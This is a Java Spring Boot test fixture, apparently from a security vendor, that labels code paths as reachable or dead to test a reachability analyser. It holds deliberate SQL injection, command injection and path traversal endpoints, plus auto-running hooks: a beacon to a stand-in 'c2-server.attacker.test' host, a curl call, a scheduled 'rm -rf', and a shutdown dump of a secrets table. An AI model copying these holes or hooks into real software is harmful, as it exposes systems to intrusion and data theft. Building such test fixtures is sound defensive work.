// Copyright © 2026 Sthenos Security. All rights reserved.
// ============================================================================
// INVOCATION PATTERNS TEST — All 3 Cases (Java / Spring Boot)
//
// Case 1: External endpoint — @PostMapping/@GetMapping (REACHABLE)
// Case 2: Internal trigger — @PostConstruct, @Scheduled, static{}, Thread
// Case 3: Dead code — public methods never called (NOT_REACHABLE)
// ============================================================================
package com.example;

import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.web.bind.annotation.*;
import javax.annotation.PostConstruct;
import java.io.*;
import java.net.*;
import java.sql.*;
import java.util.Map;
import java.util.concurrent.*;

@RestController
@RequestMapping("/invocation")
public class InvocationPatterns {

    // ════════════════════════════════════════════════════════════════════
    // CASE 1: External Endpoint — REACHABLE + ATTACKER_CONTROLLED
    // ════════════════════════════════════════════════════════════════════

    /** CWE-89 REACHABLE: HTTP param → SQL string concat. */
    @PostMapping("/case1/sqli")
    public Map<String, Object> case1Sqli(@RequestBody Map<String, String> body) throws Exception {
        String name = body.get("name");
        Connection conn = DriverManager.getConnection("jdbc:h2:mem:test", "sa", "");
        // CWE-89 REACHABLE: user input in SQL
        Statement stmt = conn.createStatement();
        stmt.executeQuery("SELECT * FROM users WHERE name='" + name + "'");
        return Map.of("status", "ok");
    }

    /** CWE-78 REACHABLE: HTTP param → Runtime.exec. */
    @PostMapping("/case1/cmdi")
    public Map<String, Object> case1Cmdi(@RequestBody Map<String, String> body) throws Exception {
        String cmd = body.get("cmd");
        // CWE-78 REACHABLE: user-controlled command
        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
        return Map.of("status", "ok");
    }

    /** CWE-22 REACHABLE: HTTP param → file read. */
    @GetMapping("/case1/path")
    public Map<String, Object> case1Path(@RequestParam String file) throws Exception {
        // CWE-22 REACHABLE: unsanitized path
        String content = new String(java.nio.file.Files.readAllBytes(
            java.nio.file.Paths.get("/var/data", file)));
        return Map.of("content", content);
    }


    // ════════════════════════════════════════════════════════════════════
    // CASE 2: Internal Triggers — REACHABLE but RA misses them
    // ════════════════════════════════════════════════════════════════════

    /** Subtype A: @PostConstruct — runs once at bean initialization. */
    @PostConstruct
    public void initTelemetry() {
        try {
            // CWE-78: shell command with constant — auto-runs at startup
            Runtime.getRuntime().exec(new String[]{
                "sh", "-c", "echo 'startup telemetry' >> /tmp/java_init.log"
            });
        } catch (IOException e) { /* ignore */ }
    }

    /** Subtype B: @Scheduled — runs every 60 seconds. */
    @Scheduled(fixedRate = 60000)
    public void scheduledCleanup() {
        try {
            // CWE-78: shell command with constant — runs on schedule
            Runtime.getRuntime().exec(new String[]{
                "sh", "-c", "rm -rf /tmp/expired_java_sessions/*"
            });
        } catch (IOException e) { /* ignore */ }
    }

    /** Subtype C: static initializer block — runs when class is loaded. */
    static {
        try {
            // CWE-78: shell command in static init — runs at class load
            Runtime.getRuntime().exec(new String[]{
                "sh", "-c", "curl -s https://telemetry.internal.example.com/ping"
            });
        } catch (IOException e) { /* ignore */ }
    }

    /** Subtype D: Thread launched from constructor. */
    private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();

    {
        // Instance initializer — runs for every new InvocationPatterns instance
        scheduler.scheduleAtFixedRate(() -> {
            try {
                // CWE-918: SSRF-like beacon with constant URL
                new URL("https://c2-server.attacker.test/checkin").openConnection().connect();
            } catch (Exception e) { /* ignore */ }
        }, 30, 30, TimeUnit.SECONDS);
    }

    /** Subtype E: Shutdown hook — runs when JVM terminates. */
    static {
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            try {
                // CWE-200: writes environment to file at shutdown
                Connection conn = DriverManager.getConnection("jdbc:h2:mem:test", "sa", "");
                ResultSet rs = conn.createStatement().executeQuery("SELECT * FROM secrets");
                try (FileWriter fw = new FileWriter("/tmp/java_shutdown_dump.txt")) {
                    while (rs.next()) {
                        fw.write(rs.getString(1) + "\n");
                    }
                }
            } catch (Exception e) { /* ignore */ }
        }));
    }


    // ════════════════════════════════════════════════════════════════════
    // CASE 3: Dead Code — NOT_REACHABLE (never called)
    // ════════════════════════════════════════════════════════════════════

    /** CWE-89 NOT_REACHABLE: public method, never wired to any route or trigger. */
    public void deadSqli(String userInput) throws Exception {
        Connection conn = DriverManager.getConnection("jdbc:h2:mem:test", "sa", "");
        // CWE-89 NOT_REACHABLE: no call path
        conn.createStatement().executeQuery(
            "DELETE FROM sessions WHERE token='" + userInput + "'");
    }

    /** CWE-78 NOT_REACHABLE: never called. */
    public String deadCmdi(String cmd) throws Exception {
        // CWE-78 NOT_REACHABLE: no call path
        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
        return new String(p.getInputStream().readAllBytes());
    }

    /** CWE-22 NOT_REACHABLE: never called. */
    public String deadPathTraversal(String filename) throws Exception {
        // CWE-22 NOT_REACHABLE: no call path
        return new String(java.nio.file.Files.readAllBytes(
            java.nio.file.Paths.get("/var/data", filename)));
    }
}
